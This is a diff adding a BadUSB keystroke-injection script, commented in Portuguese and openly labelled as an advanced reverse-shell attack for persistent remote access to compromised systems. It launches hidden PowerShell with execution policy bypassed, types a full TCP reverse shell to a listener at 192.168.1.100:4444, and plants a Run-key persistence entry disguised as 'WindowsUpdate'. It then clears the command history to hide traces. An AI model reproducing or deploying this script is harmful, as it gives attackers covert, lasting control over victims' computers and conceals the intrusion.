@@ -1,0 +1,44 @@
+REM =================================================================
+REM Ataque BadUSB - Reverse Shell Avançado
+REM =================================================================
+REM
+REM Descrição: Script BadUSB que estabelece uma conexão reversa com o
+REM atacante, fornecendo controle total sobre o sistema.
+REM
+ Quando usar: Para obter acesso remoto persistente a sistemas
+ comprometidos.
+REM
+ Como usar: Conectar o dispositivo BadUSB e o script será executado
+REM automaticamente. Configure o LHOST e LPORT antes do uso.
+REM
+ Observações: Requer um listener ativo no endereço IP e porta
+REM especificados. Modifique conforme necessário.
+REM
+=================================================================
+
+DELAY 1000
+
+Abre o PowerShell em modo oculto
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+Estabelece conexão reversa avançada
+STRING $LHOST = "192.168.1.100"; $LPORT = 4444; $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()
+
+ENTER
+
+Persistência - Adiciona ao startup
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"\$LHOST='192.168.1.100'; \$LPORT=4444; \$client=New-Object System.Net.Sockets.TCPClient(\$LHOST,\$LPORT); \$stream=\$client.GetStream(); [byte[]]\$bytes=0..65535|%{0}; while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length))-ne 0) { \$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback=(iex \$data 2>&1 | Out-String ); \$sendback2=\$sendback+'PS '+ (Get-Location).Path+'> '; \$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush() }; \$client.Close()\"" -Force
+
+ENTER
+
+Limpa o histórico
+STRING Clear-History
+ENTER
+
+Fecha o PowerShell
+STRING exit
+ENTER
